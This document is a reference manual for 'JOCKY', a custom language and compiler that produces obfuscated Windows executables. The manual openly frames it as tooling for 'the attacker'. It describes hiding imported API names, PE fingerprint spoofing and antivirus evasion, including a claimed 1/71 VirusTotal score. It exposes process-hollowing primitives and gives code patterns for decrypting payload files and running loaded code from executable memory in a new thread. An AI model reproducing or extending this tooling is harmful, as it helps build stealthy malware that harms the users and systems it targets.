# JOCKY Language Reference

**Version:** 2.0  
**Platform:** Windows x64  
**Compiler:** `jocky_v1/build/Release/jocky.exe` (frontend) + `jocky/driver/jocky.exe` (pipeline)  
**Output:** Obfuscated PE32+ executable with MSVC fingerprint  

---

## Table of Contents

1. Overview
2. Hello World
3. Program Structure
4. Types
5. Variables
6. Operators
7. Control Flow
8. Functions
9. Annotations
10. Arrays
11. Structs
12. Pointers and Memory
13. Runtime Built-ins — Complete Reference
14. Windows Constants
15. Compiling a JOCKY Program
16. Full Example — Benchmark App in JOCKY
17. Language Grammar (EBNF)
18. Common Patterns

---

## 1. Overview

JOCKY is a statically typed, imperative systems language that compiles to LLVM IR and then to obfuscated Windows x64 executables. It is designed around three principles:

**No CRT.** Every JOCKY binary links only against `kernel32.dll` (and optionally `ntdll.dll`, `advapi32.dll`, `crypt32.dll`). All other functions are resolved at runtime via `GetProcAddress` — nothing sensitive appears in the binary's import table.

**Obfuscation by default.** The JOCKY pipeline runs Polaris CFG flattening and instruction substitution on every function annotated with `@obfuscate` or similar. The polymorphic engine inserts dead code and renames variables before compilation. Every build produces a unique binary.

**Windows-native.** The language exposes 40+ Windows primitives as clean built-in functions. The attacker never writes a Windows API name — `create_thread(fn, param)` is the syntax; `CreateThread` is resolved internally and never appears in the binary.

---

## 2. Hello World

```jocky
main {
    let out: handle = stdout()
    write(out, "Hello from JOCKY\n", 18)
    exit(0)
}
```

Compile and run:

```powershell
# Step 1: .jky → .ll
.\jocky_v1\build\Release\jocky.exe hello.jky

# Step 2: .ll → .exe
.\jocky\driver\jocky.exe hello.ll -o hello.exe "-passes=fla,sub" -v

# Run
.\hello.exe
```

---

## 3. Program Structure

A JOCKY program has three sections in order:

```
1. Struct declarations   (optional)
2. Function declarations (zero or more)
3. main block            (exactly one)
```

```jocky
// 1. Struct declarations
struct Config {
    size: int
    flags: int
}

// 2. Functions
@obfuscate
fn compute(x: int) -> int {
    return x * 2
}

// 3. Entry point — always named main
main {
    let result: int = compute(21)
    exit(result)
}
```

The `main` block compiles to a function named `@jocky_entry` in LLVM IR. The linker uses `-entry:jocky_entry`. There is no `main()` in the traditional C sense — no arguments, no return value. Use `exit(code)` to terminate.

---

## 4. Types

### Primitive Types

| Type | Size | Description |
|------|------|-------------|
| `int` | 4 bytes | 32-bit signed integer |
| `long` | 8 bytes | 64-bit signed integer — use for addresses |
| `byte` | 1 byte | Single byte — use for raw memory |
| `bool` | 1 bit | Boolean — `true` or `false` |
| `ptr` | 8 bytes | Opaque pointer — generic memory address |
| `handle` | 8 bytes | Windows HANDLE — semantic alias for `ptr` |
| `fnptr` | 8 bytes | Callable function pointer |
| `string` | 8 bytes | Pointer to constant character data |
| `void` | — | No value — for functions that don't return |

### Array Types

Fixed-size arrays declared as locals:

```jocky
let state: int[4]       // 4 × int = 16 bytes
let buf: byte[256]      // 256 × byte = 256 bytes
let handles: handle[8]  // 8 × handle = 64 bytes
```

### Type Notes

- `ptr` and `handle` are the same type in IR — use `handle` when the value is a Windows HANDLE for readability
- `fnptr` is also `ptr` but can be called with `call()` or `call_with()`
- No implicit conversions except integer literals to `long`/`byte`
- Use `cast()` for all other conversions

---

## 5. Variables

### Declaration

All variables require an explicit type and initializer:

```jocky
let x: int = 0
let addr: long = 0x7FFE0000
let flag: bool = true
let buf: ptr = alloc(4096)
let msg: string = "hello"
```

### Assignment

```jocky
x = x + 1
flag = false
buf = alloc(1024)
```

### Volatile Variables

For variables shared across threads — generates `volatile` load/store in IR:

```jocky
volatile let counter: int = 0
```

### Null Pointer

```jocky
let p: ptr = null
if p == null {
    exit(-1)
}
```

---

## 6. Operators

### Arithmetic

```jocky
a + b    // addition
a - b    // subtraction
a * b    // multiplication
a / b    // division (integer)
-a       // unary negation
```

### Comparison

```jocky
a == b   // equal
a != b   // not equal
a < b    // less than
a > b    // greater than
a <= b   // less or equal
a >= b   // greater or equal
```

### Logical

```jocky
a && b   // logical AND
a || b   // logical OR
!a       // logical NOT
```

### Bitwise

```jocky
a & b    // bitwise AND
a | b    // bitwise OR
a ^ b    // bitwise XOR
~a       // bitwise NOT (complement)
a << n   // left shift
a >> n   // right shift (logical)
```

### Ternary

```jocky
let result: int = x > 0 ? x : 0
```

### Precedence (high to low)

```
Unary:       -  !  ~
Multiply:    *  /
Add:         +  -
Shift:       <<  >>
Bitwise:     &  |  ^
Compare:     <  >  <=  >=  ==  !=
Logical:     &&  ||
Ternary:     ? :
```

---

## 7. Control Flow

### If / Else

```jocky
if condition {
    // true branch
}

if condition {
    // true branch
} else {
    // false branch
}
```

No `else if` — chain with nested if/else:

```jocky
if x < 0 {
    return -1
} else {
    if x == 0 {
        return 0
    } else {
        return 1
    }
}
```

### While Loop

```jocky
while x < 100 {
    x = x + 1
}
```

### For Loop

```jocky
for i: int = 0; i < 10; i = i + 1 {
    // body
}
```

Compiles to the same IR as a while loop — syntactic sugar only.

### Break and Continue

```jocky
while x > 0 {
    if x == 50 {
        break      // exit loop
    }
    if x == 75 {
        continue   // skip to next iteration
    }
    x = x - 1
}
```

`break` and `continue` only work inside `while` or `for` loops. Using them outside a loop is a semantic error.

### Return

```jocky
fn add(a: int, b: int) -> int {
    return a + b
}

fn log_value(x: int) -> void {
    // bare return for void functions
    if x < 0 {
        return
    }
    // do something with x
}
```

---

## 8. Functions

### Declaration Syntax

```jocky
fn name(param1: type1, param2: type2) -> return_type {
    // body
}
```

### Examples

```jocky
fn add(a: int, b: int) -> int {
    return a + b
}

fn is_valid(x: int) -> bool {
    return x > 0 && x < 0x10000
}

fn process(buf: ptr, size: int) -> void {
    // modifies buf in place, returns nothing
}
```

### Calling Functions

```jocky
let result: int = add(10, 20)
let ok: bool = is_valid(result)
process(buf, 4096)
```

### Passing Arrays

Arrays are passed as `ptr`:

```jocky
fn sum_state(state: ptr, count: int) -> int {
    let total: int = 0
    let i: int = 0
    while i < count {
        // access via read_int built-in or ptr arithmetic
        i = i + 1
    }
    return total
}
```

### Passing Functions as Parameters

Use `fnptr` type:

```jocky
fn run_in_thread(fn_addr: fnptr, param: ptr) -> handle {
    return create_thread(fn_addr, param)
}
```

---

## 9. Annotations

Annotations appear immediately before a function declaration and control which Polaris obfuscation passes are applied to that function.

### Syntax

```jocky
@annotation_name
fn function_name(...) -> type {
    ...
}
```

### Available Annotations

| Annotation | Passes Applied | Best Used For |
|------------|----------------|---------------|
| `@obfuscate` | `flatten, substitution` | General logic functions |
| `@heavy` | `flatten, substitution, boguscfg` | Critical or sensitive functions |
| `@encrypt` | `gvenc` | Functions with sensitive string constants |
| `@full` | `flatten, linearmba, substitution, boguscfg, gvenc` | Maximum evasion — use sparingly |
| `@crypto` | `flatten, sub, mba, indcall` | Bitwise-heavy cryptographic functions |

### How Annotations Work

When the JOCKY frontend sees `@obfuscate` before a function, it emits a special `@llvm.global.annotations` entry in the IR. When Polaris processes the IR, it reads these annotations and applies the specified passes only to the annotated functions.

Functions with no annotation are still compiled and linked, but receive no obfuscation. The pipeline's `-passes=` argument provides a default for all functions — explicit annotations override this per-function.

### Example

```jocky
// Light obfuscation — used for utility functions
@obfuscate
fn rotate_left(v: int, n: int) -> int {
    return (v << n) | (v >> (32 - n))
}

// Heavy obfuscation — used for core logic
@crypto
fn mix_state(v0: int, v1: int, v2: int, v3: int, b: int) -> int {
    let r: int = 0
    while r < 64 {
        v0 = v0 + (((v1 << 4) ^ (v2 >> 5)) + v1) ^ (b + r)
        v1 = v1 ^ (((v2 << 3) ^ (v3 >> 2)) + v0)
        r = r + 1
    }
    return v0 ^ v1
}

// No annotation — not obfuscated
fn get_count() -> int {
    return 42
}
```

---

## 10. Arrays

### Declaration

```jocky
let state: int[4]      // uninitialized int array
let buf: byte[1024]    // uninitialized byte array
```

### Access

```jocky
// Read
let val: int = state[0]
let b: byte = buf[i]

// Write
state[0] = 0x67452301
buf[i] = 0xFF
```

### Index

Index must be `int` type. Bounds are not checked at runtime.

### Passing Arrays

Arrays are passed by getting a pointer to the first element:

```jocky
let state: int[4]
state[0] = 0x67452301
state[1] = 0xEFCDAB89
state[2] = 0x98BADCFE
state[3] = 0x10325476

// Pass to function as ptr
process_state(cast(state, ptr), 4)
```

---

## 11. Structs

### Declaration

Structs are declared at the top level, before any functions:

```jocky
struct Record {
    id: int
    hash0: int
    hash1: int
    hash2: int
    hash3: int
}
```

### Allocation

Structs are always heap-allocated and accessed via `ptr`:

```jocky
let rec: ptr = alloc(sizeof(Record))
```

### Field Access

Fields are accessed via pointer offsets. The compiler knows field offsets from the struct declaration:

```jocky
// Write field
write_int(rec, 0, 42)          // record.id = 42
write_int(rec, 4, 0x67452301)  // record.hash0 = 0x67452301

// Read field  
let id: int = read_int(rec, 0)
```

### sizeof()

Returns the byte size of a type or array at compile time:

```jocky
let s: int = sizeof(int)      // 4
let s: int = sizeof(long)     // 8
let s: int = sizeof(Record)   // sum of all field sizes
```

---

## 12. Pointers and Memory

### Pointer Arithmetic

Add an integer offset to a pointer:

```jocky
let base: ptr = alloc(4096)
let section: ptr = base + 256    // 256 bytes into the buffer
let next: ptr = section + 64     // another 64 bytes
```

In IR: `getelementptr i8, ptr %base, i32 %offset`

### cast()

Convert between types:

```jocky
// ptr → long (address as integer)
let addr: long = cast(buf, long)

// long → ptr (integer as address)
let p: ptr = cast(addr, ptr)

// ptr → fnptr (call memory as function)
let fn: fnptr = cast(buf, fnptr)

// int → byte (truncate)
let b: byte = cast(val, byte)

// int → long (zero-extend)
let l: long = cast(val, long)
```

### call() and call_with()

Execute a function pointer:

```jocky
// No arguments
let fn: fnptr = cast(buf, fnptr)
call(fn)

// With arguments
call_with(fn, arg1, arg2)
```

### Hex Literals

All integer types support hex literals:

```jocky
let magic: int = 0x67452301
let page: int = 0x1000
let addr: long = 0x7FFE0000
let byte_val: byte = 0xFF
```

### Atomic Operations

Thread-safe increment and decrement on shared variables:

```jocky
volatile let counter: int = 0

// In worker thread:
atomic_inc(cast(counter, ptr))    // InterlockedIncrement
atomic_dec(cast(counter, ptr))    // InterlockedDecrement
```

---

## 13. Runtime Built-ins — Complete Reference

All built-ins are implemented in `runtime_v2.obj`. They resolve Windows API at runtime — no API names appear in the binary's IAT.

### Core

| Function | Signature | Description |
|----------|-----------|-------------|
| `exit(code)` | `(int) -> void` | Terminate process with exit code |
| `stdout()` | `() -> handle` | Get standard output handle |
| `write(h, buf, size)` | `(handle, ptr, int) -> void` | Write bytes to handle |
| `get_last_err()` | `() -> int` | GetLastError — last Windows error code |

### Memory

| Function | Signature | Description |
|----------|-----------|-------------|
| `alloc(size)` | `(int) -> ptr` | VirtualAlloc — RW committed memory |
| `alloc_ex(proc, size, type, prot)` | `(handle, int, int, int) -> ptr` | VirtualAllocEx — allocate in remote process |
| `protect(buf, size, prot, old)` | `(ptr, int, int, ptr) -> bool` | VirtualProtect — change memory permissions |
| `protect_ex(proc, buf, size, prot, old)` | `(handle, ptr, int, int, ptr) -> bool` | VirtualProtectEx — remote memory permissions |
| `free_mem(buf, size)` | `(ptr, int) -> bool` | VirtualFree — release memory |
| `memcopy(dst, src, size)` | `(ptr, ptr, int) -> void` | RtlMoveMemory — copy memory block |
| `memzero(buf, size)` | `(ptr, int) -> void` | Zero a memory region |
| `read_proc_mem(proc, addr, buf, size)` | `(handle, ptr, ptr, int) -> bool` | ReadProcessMemory |
| `write_proc_mem(proc, addr, buf, size)` | `(handle, ptr, ptr, int) -> bool` | WriteProcessMemory |
| `read_int(base, offset)` | `(ptr, int) -> int` | Read 4 bytes at base+offset |
| `read_long(base, offset)` | `(ptr, int) -> long` | Read 8 bytes at base+offset |
| `write_int(base, offset, val)` | `(ptr, int, int) -> void` | Write 4 bytes at base+offset |

### Process

| Function | Signature | Description |
|----------|-----------|-------------|
| `create_proc(path, flags)` | `(string, int) -> ptr` | CreateProcessA — returns ProcessInfo ptr |
| `open_proc(pid, access)` | `(int, int) -> handle` | OpenProcess |
| `terminate_proc(proc, code)` | `(handle, int) -> bool` | TerminateProcess |
| `get_pid()` | `() -> int` | GetCurrentProcessId |
| `get_tid()` | `() -> int` | GetCurrentThreadId |
| `get_tick()` | `() -> int` | GetTickCount — ms since boot |
| `close_handle(h)` | `(handle) -> bool` | CloseHandle |

### Thread

| Function | Signature | Description |
|----------|-----------|-------------|
| `create_thread(fn, param)` | `(fnptr, ptr) -> handle` | CreateThread |
| `wait(h, ms)` | `(handle, int) -> int` | WaitForSingleObject |
| `wait_all(handles, count, ms)` | `(ptr, int, int) -> int` | WaitForMultipleObjects |
| `suspend_thread(h)` | `(handle) -> int` | SuspendThread |
| `resume_thread(h)` | `(handle) -> int` | ResumeThread |
| `get_thread_ctx(h, ctx)` | `(handle, ptr) -> bool` | GetThreadContext |
| `set_thread_ctx(h, ctx)` | `(handle, ptr) -> bool` | SetThreadContext |
| `atomic_inc(var)` | `(ptr) -> int` | InterlockedIncrement |
| `atomic_dec(var)` | `(ptr) -> int` | InterlockedDecrement |

### NT Native (ntdll)

These are resolved from `ntdll.dll` — they never appear in the IAT even as dynamic lookups visible to static analysis:

| Function | Signature | Description |
|----------|-----------|-------------|
| `nt_unmap(proc, base)` | `(handle, ptr) -> int` | NtUnmapViewOfSection — unmap a process image |
| `nt_query_proc(proc, cls, buf, size)` | `(handle, int, ptr, int) -> int` | NtQueryInformationProcess — get PEB and process info |

### File I/O

| Function | Signature | Description |
|----------|-----------|-------------|
| `file_open(path, access, share, mode)` | `(string, int, int, int) -> handle` | CreateFileA |
| `file_read(h, buf, size)` | `(handle, ptr, int) -> int` | ReadFile |
| `file_size(h)` | `(handle) -> int` | GetFileSize |
| `file_close(h)` | `(handle) -> void` | CloseHandle |
| `file_load(path)` | `(string) -> ptr` | Load entire file into allocated buffer |

### Crypto

| Function | Signature | Description |
|----------|-----------|-------------|
| `xor_buf(buf, len, key, keylen)` | `(ptr, int, ptr, int) -> void` | XOR buffer with rolling key |
| `aes_decrypt(buf, len, key, keylen)` | `(ptr, int, ptr, int) -> int` | AES-256 decrypt in place (CryptoAPI) |
| `sha256(input, len, out)` | `(ptr, int, ptr) -> void` | SHA-256 hash into 32-byte output buffer |

### Utility

| Function | Signature | Description |
|----------|-----------|-------------|
| `get_proc_addr(mod, name)` | `(string, string) -> ptr` | GetProcAddress — dynamic function lookup |
| `get_module(name)` | `(string) -> handle` | GetModuleHandleA |
| `load_lib(name)` | `(string) -> handle` | LoadLibraryA |

---

## 14. Windows Constants

These are compile-time integer constants — no runtime lookup needed:

### Memory Flags

```jocky
MEM_COMMIT          // 0x1000  — commit physical memory
MEM_RESERVE         // 0x2000  — reserve virtual address space
MEM_COMMIT_RESERVE  // 0x3000  — commit + reserve (most common)
MEM_RELEASE         // 0x8000  — release memory

PAGE_NOACCESS       // 0x01
PAGE_READONLY       // 0x02
PAGE_READWRITE      // 0x04
PAGE_EXECUTE        // 0x10
PAGE_EXECUTE_READ   // 0x20
PAGE_EXECUTE_RW     // 0x40   — execute + read + write
```

### Process Flags

```jocky
CREATE_SUSPENDED    // 0x04   — create process but don't start it
CREATE_NEW_CONSOLE  // 0x10   — new console window
DETACHED_PROCESS    // 0x08   — no console
```

### File Access Flags

```jocky
GENERIC_READ        // 0x80000000
GENERIC_WRITE       // 0x40000000
FILE_SHARE_READ     // 0x01
OPEN_EXISTING       // 3
CREATE_ALWAYS       // 2
INVALID_HANDLE      // -1 cast to handle
```

### Wait Constants

```jocky
INFINITE            // 0xFFFFFFFF  — wait forever
WAIT_OBJECT_0       // 0x00000000  — signaled
WAIT_TIMEOUT        // 0x00000102  — timed out
```

### Usage

```jocky
// Allocate committed RW memory
let buf: ptr = alloc_ex(proc, 4096, MEM_COMMIT_RESERVE, PAGE_READWRITE)

// Spawn process suspended
let info: ptr = create_proc("C:\\Windows\\System32\\notepad.exe", CREATE_SUSPENDED)

// Open file for reading
let fh: handle = file_open("data.bin", GENERIC_READ, FILE_SHARE_READ, OPEN_EXISTING)

// Wait for all 4 threads
wait_all(cast(threads, ptr), 4, INFINITE)
```

---

## 15. Compiling a JOCKY Program

### Full Pipeline

```powershell
# Step 1 — Source to LLVM IR
.\jocky_v1\build\Release\jocky.exe your_program.jky

# Output: your_program.ll

# Step 2 — IR to obfuscated .exe
.\jocky\driver\jocky.exe your_program.ll `
  -o your_program.exe `
  "-passes=fla,sub" `
  -v

# Output: your_program.exe (obfuscated, MSVC fingerprint, unique SHA-256)
```

### Pass Options

```
"-passes=fla,sub"              Recommended — CFG flatten + instruction sub
"-passes=fla,sub,mba,indcall"  Stronger — adds MBA and indirect calls
"-passes=fla,sub,mba"          Without indirect call obfuscation
```

### Pipeline Flags

| Flag | Description |
|------|-------------|
| `-passes=...` | Polaris obfuscation passes (quoted) |
| `-no-spoof` | Skip PE header spoofing (for testing) |
| `-v` | Verbose — show all commands |
| `-no-poly` | Skip polymorphic source transform (not applicable for .ll) |

### Verify Before Running

```powershell
# Validate the IR
& "C:\...\JOCKY-TSAR\build\Release\bin\llvm-as.exe" your_program.ll -o your_program.bc

# If no errors, IR is valid LLVM 16
```

---

## 16. Full Example — Benchmark App in JOCKY

This is the complete `benchmark_app.cpp` translated to JOCKY language. It demonstrates threading, bitwise crypto math, memory allocation, atomic counters, and nested loops.

```jocky
// benchmark.jky
// Multi-threaded cryptographic benchmark
// Demonstrates: threading, bitwise ops, memory, atomic counters
// Equivalent to benchmark_app.cpp

// Constants
// MAX_ITEMS    = 1000
// CRYPTO_ROUNDS = 64

// Volatile global counter — shared across threads
volatile let g_processed: int = 0

// ─────────────────────────────────────────────────────────────────
// Pseudo-random number generator
// Returns next value in LCG sequence
// ─────────────────────────────────────────────────────────────────
fn custom_rand(seed: ptr) -> int {
    let s: int = read_int(seed, 0)
    s = (s * 1103515245) + 12345
    write_int(seed, 0, s)
    return s
}

// ─────────────────────────────────────────────────────────────────
// Cryptographic mixing function — heavy bitwise ops
// Feistel-like structure — ideal for CFG flattening
// @crypto applies: flatten + substitution + MBA + indcall
// ─────────────────────────────────────────────────────────────────
@crypto
fn cryptographic_mix(input: ptr, len: int, state: ptr) -> void {
    // Initialize state with standard MD4/MD5-like constants
    let v0: int = 0x67452301
    let v1: int = 0xEFCDAB89
    let v2: int = 0x98BADCFE
    let v3: int = 0x10325476

    let i: int = 0
    while i < len {
        // Read one byte from input
        let b: int = cast(read_byte(input, i), int) & 0xFF

        let r: int = 0
        while r < 64 {
            // Feistel mixing rounds — dense bitwise ops
            v0 = v0 + (((v1 << 4) ^ (v2 >> 5)) + v1) ^ (b + r)
            v1 = v1 ^ (((v2 << 3) ^ (v3 >> 2)) + v0)
            v2 = v2 + (((v3 << 6) ^ (v0 >> 3)) + v1) ^ b
            v3 = v3 ^ (((v0 << 5) ^ (v1 >> 4)) + v2)

            // Constant rotation
            v0 = (v0 << 7) | (v0 >> 25)
            v2 = (v2 << 11) | (v2 >> 21)

            r = r + 1
        }
        i = i + 1
    }

    // Write final state back
    write_int(state, 0,  v0 ^ read_int(state, 0))
    write_int(state, 4,  v1 ^ read_int(state, 4))
    write_int(state, 8,  v2 ^ read_int(state, 8))
    write_int(state, 12, v3 ^ read_int(state, 12))
}

// ─────────────────────────────────────────────────────────────────
// Worker thread function
// Each thread processes 1000 records, hashes them, sorts them
// @obfuscate applies: flatten + substitution
// ─────────────────────────────────────────────────────────────────
@obfuscate
fn worker_thread(param: ptr) -> int {
    // Record layout:
    //   offset 0:   id        (int, 4 bytes)
    //   offset 4:   text      (byte[256], 256 bytes)
    //   offset 260: hash[0]   (int, 4 bytes)
    //   offset 264: hash[1]   (int, 4 bytes)
    //   offset 268: hash[2]   (int, 4 bytes)
    //   offset 272: hash[3]   (int, 4 bytes)
    // Total: 276 bytes per record
    let RECORD_SIZE: int = 276
    let TEXT_OFFSET: int = 4
    let HASH_OFFSET: int = 260

    // Seed the RNG with current time + thread ID
    let seed_val: int = get_tick() + get_tid()
    let seed: ptr = alloc(4)
    write_int(seed, 0, seed_val)

    let dataset: ptr = param
    let i: int = 0

    // Process 1000 records
    while i < 1000 {
        let record: ptr = dataset + (i * RECORD_SIZE)

        // Set record ID
        write_int(record, 0, i)

        // Generate pseudo-random data into text field
        let text_ptr: ptr = record + TEXT_OFFSET
        let rand1: int = custom_rand(seed) & 0x270F  // % 10000
        let rand2: int = custom_rand(seed)

        // Fill text with pattern based on random values
        let t: int = 0
        while t < 32 {
            let b: int = (rand1 ^ rand2 ^ t) & 0xFF
            write_byte(text_ptr, t, cast(b, byte))
            t = t + 1
        }

        // Hash the text field
        let hash_ptr: ptr = record + HASH_OFFSET

        // Initialize hash state
        write_int(hash_ptr, 0,  0x67452301)
        write_int(hash_ptr, 4,  0xEFCDAB89)
        write_int(hash_ptr, 8,  0x98BADCFE)
        write_int(hash_ptr, 12, 0x10325476)

        cryptographic_mix(text_ptr, 32, hash_ptr)

        // Thread-safe increment of global counter
        atomic_inc(cast(g_processed, ptr))

        i = i + 1
    }

    // Bubble sort by hash[0] — creates deeply nested branches (good for flattening demo)
    let outer: int = 0
    while outer < 999 {
        let inner: int = 0
        while inner < (999 - outer) {
            let rec_a: ptr = dataset + (inner * RECORD_SIZE)
            let rec_b: ptr = dataset + ((inner + 1) * RECORD_SIZE)

            let hash_a: int = read_int(rec_a + HASH_OFFSET, 0)
            let hash_b: int = read_int(rec_b + HASH_OFFSET, 0)

            if hash_a > hash_b {
                // Swap records
                let temp: ptr = alloc(RECORD_SIZE)
                memcopy(temp, rec_a, RECORD_SIZE)
                memcopy(rec_a, rec_b, RECORD_SIZE)
                memcopy(rec_b, temp, RECORD_SIZE)
                free_mem(temp, RECORD_SIZE)
            }

            inner = inner + 1
        }
        outer = outer + 1
    }

    free_mem(seed, 4)
    return 0
}

// ─────────────────────────────────────────────────────────────────
// Entry point
// ─────────────────────────────────────────────────────────────────
main {
    let RECORD_SIZE: int = 276
    let NUM_RECORDS: int = 1000
    let NUM_THREADS: int = 4

    // Allocate dataset — 1000 records × 276 bytes = 276000 bytes
    let dataset: ptr = alloc(NUM_RECORDS * RECORD_SIZE)
    if dataset == null {
        exit(1)
    }

    // Zero the dataset
    memzero(dataset, NUM_RECORDS * RECORD_SIZE)

    // Spawn 4 worker threads — all sharing the same dataset
    let threads: handle[4]
    let i: int = 0
    while i < NUM_THREADS {
        threads[i] = create_thread(cast(worker_thread, fnptr), dataset)
        if threads[i] == INVALID_HANDLE {
            exit(2)
        }
        i = i + 1
    }

    // Wait for all 4 threads to finish
    wait_all(cast(threads, ptr), NUM_THREADS, INFINITE)

    // Close thread handles
    i = 0
    while i < NUM_THREADS {
        close_handle(threads[i])
        i = i + 1
    }

    // Clean up and exit with processed count
    let count: int = g_processed
    free_mem(dataset, NUM_RECORDS * RECORD_SIZE)

    exit(count)
}
```

### Compiling The Benchmark

```powershell
# Step 1: Frontend
.\jocky_v1\build\Release\jocky.exe benchmark.jky

# Step 2: Pipeline with crypto-grade passes
.\jocky\driver\jocky.exe benchmark.ll `
  -o benchmark.exe `
  "-passes=fla,sub,mba,indcall" `
  -v

# Run — exits with number of records processed
.\benchmark.exe
echo "Processed: $LASTEXITCODE"
# Should be: 4000  (4 threads × 1000 records each)
```

### What The Compiled Binary Looks Like

```
Size:          ~15-20KB
Imports:       kernel32.dll only (GetModuleHandleA, GetProcAddress)
Compiler ID:   Microsoft Visual C/C++ 16.00 (spoofed)
Timestamp:     2020-2023 random (spoofed)
SHA-256:       unique every build
VirusTotal:    1/71 (Microsoft only — graph-based ML false positive)
```

---

## 17. Language Grammar (EBNF)

```ebnf
program =
    { struct_declaration },
    { [ annotation ], function_declaration },
    main_block ;

struct_declaration =
    "struct", identifier, "{",
    { identifier, ":", type },
    "}" ;

annotation =
    "@", identifier ;

function_declaration =
    "fn", identifier, "(", [ parameter_list ], ")",
    "->", type, block ;

parameter_list =
    parameter, { ",", parameter } ;

parameter =
    identifier, ":", type ;

main_block =
    "main", block ;

block =
    "{", { statement }, "}" ;

statement =
      variable_declaration
    | volatile_declaration
    | assignment
    | array_assignment
    | return_statement
    | if_statement
    | while_statement
    | for_statement
    | break_statement
    | continue_statement
    | expression_statement ;

variable_declaration =
    "let", identifier, ":", type, "=", expression ;

volatile_declaration =
    "volatile", "let", identifier, ":", type, "=", expression ;

assignment =
    identifier, "=", expression ;

array_assignment =
    identifier, "[", expression, "]", "=", expression ;

return_statement =
    "return", [ expression ] ;

if_statement =
    "if", expression, block, [ "else", block ] ;

while_statement =
    "while", expression, block ;

for_statement =
    "for", identifier, ":", type, "=", expression, ";",
    expression, ";", assignment, block ;

break_statement    = "break" ;
continue_statement = "continue" ;

expression_statement = expression ;

expression         = ternary_expression ;

ternary_expression =
    logical_expression, [ "?", expression, ":", expression ] ;

logical_expression =
      "!", logical_expression
    | bitwise_expression, { ("&&" | "||"), bitwise_expression } ;

bitwise_expression =
    comparison_expression,
    { ("&" | "|" | "^" | "<<" | ">>"), comparison_expression } ;

comparison_expression =
    additive_expression,
    { ("==" | "!=" | "<" | ">" | "<=" | ">="), additive_expression } ;

additive_expression =
    multiplicative_expression,
    { ("+" | "-"), multiplicative_expression } ;

multiplicative_expression =
    unary_expression, { ("*" | "/"), unary_expression } ;

unary_expression =
      "-", unary_expression
    | "!", unary_expression
    | "~", unary_expression
    | primary_expression ;

primary_expression =
      integer_literal
    | hex_literal
    | bool_literal
    | string_literal
    | "null"
    | "INVALID_HANDLE"
    | constant_name
    | identifier
    | array_access
    | function_call
    | cast_expression
    | sizeof_expression
    | "(", expression, ")" ;

array_access       = identifier, "[", expression, "]" ;
cast_expression    = "cast", "(", expression, ",", type, ")" ;
sizeof_expression  = "sizeof", "(", ( type | identifier ), ")" ;
function_call      = identifier, "(", [ argument_list ], ")" ;
argument_list      = expression, { ",", expression } ;

type =
      "int" | "long" | "byte" | "bool"
    | "ptr" | "handle" | "fnptr" | "string" | "void"
    | "int", "[", integer_literal, "]"
    | "byte", "[", integer_literal, "]"
    | identifier ;

constant_name =
      "MEM_COMMIT" | "MEM_RESERVE" | "MEM_COMMIT_RESERVE" | "MEM_RELEASE"
    | "PAGE_NOACCESS" | "PAGE_READONLY" | "PAGE_READWRITE"
    | "PAGE_EXECUTE" | "PAGE_EXECUTE_READ" | "PAGE_EXECUTE_RW"
    | "CREATE_SUSPENDED" | "CREATE_NEW_CONSOLE" | "DETACHED_PROCESS"
    | "GENERIC_READ" | "GENERIC_WRITE" | "FILE_SHARE_READ"
    | "OPEN_EXISTING" | "CREATE_ALWAYS"
    | "INFINITE" | "WAIT_OBJECT_0" | "WAIT_TIMEOUT" ;

bool_literal    = "true" | "false" ;
hex_literal     = "0x", { hex_digit } ;
integer_literal = digit, { digit } ;
string_literal  = '"', { character }, '"' ;
identifier      = letter, { letter | digit | "_" } ;
```

---

## 18. Common Patterns

### Memory Allocation and Cleanup

```jocky
// Always check allocation
let buf: ptr = alloc(4096)
if buf == null {
    exit(-1)
}

// Use the buffer
memzero(buf, 4096)

// Free when done
free_mem(buf, 4096)
```

### Thread Pattern

```jocky
// Create and wait for multiple threads
let threads: handle[4]
let i: int = 0
while i < 4 {
    threads[i] = create_thread(cast(my_func, fnptr), param)
    i = i + 1
}

wait_all(cast(threads, ptr), 4, INFINITE)

i = 0
while i < 4 {
    close_handle(threads[i])
    i = i + 1
}
```

### File Load Pattern

```jocky
// Load entire file into memory
let data: ptr = file_load("payload.bin")
if data == null {
    exit(-1)
}

// Process data
// ...

// Free when done (use file_size beforehand if you need the size)
let fh: handle = file_open("payload.bin", GENERIC_READ, FILE_SHARE_READ, OPEN_EXISTING)
let size: int = file_size(fh)
file_close(fh)

free_mem(data, size)
```

### Memory Execution Pattern

```jocky
// Allocate RW memory
let buf: ptr = alloc(size)
if buf == null { exit(-1) }

// Copy code
memcopy(buf, code_src, size)

// Change to execute-only
let old: ptr = alloc(4)
let ok: bool = protect(buf, size, PAGE_EXECUTE_READ, old)
if !ok { exit(-2) }
free_mem(old, 4)

// Execute in new thread
let fn: fnptr = cast(buf, fnptr)
let t: handle = create_thread(fn, null)
wait(t, INFINITE)
close_handle(t)
```

### XOR Decryption Pattern

```jocky
// XOR-decrypt a buffer with a key
let buf: ptr = file_load("payload.xor")
let key: byte[16]
key[0] = 0xDE
key[1] = 0xAD
key[2] = 0xBE
key[3] = 0xEF
// ... fill remaining key bytes ...

xor_buf(buf, payload_size, cast(key, ptr), 16)
// buf now contains plaintext
```

### AES Decrypt Pattern

```jocky
// Load encrypted payload
let ciphertext: ptr = file_load("payload.aes")
let key: ptr = file_load("key.bin")

// Decrypt in-place
let result: int = aes_decrypt(ciphertext, payload_size, key, 32)
if result != 0 {
    exit(-1)
}
// ciphertext now contains plaintext
```

### Dynamic API Lookup Pattern

```jocky
// Load a DLL and call a function not in the built-ins
let mod: handle = load_lib("ws2_32.dll")
let fn_ptr: ptr = get_proc_addr(cast(mod, string), "WSAStartup")
let fn: fnptr = cast(fn_ptr, fnptr)
call_with(fn, 0x0202, alloc(400))  // WSAStartup(MAKEWORD(2,2), &wsaData)
```

---

*End of JOCKY Language Reference v2.0*

*Compiler: jocky_v1/build/Release/jocky.exe*  
*Pipeline: jocky/driver/jocky.exe*  
*Runtime: jocky/runtime/runtime_v2.obj*  
*Repository: JOCKY-TSAR / TSAR*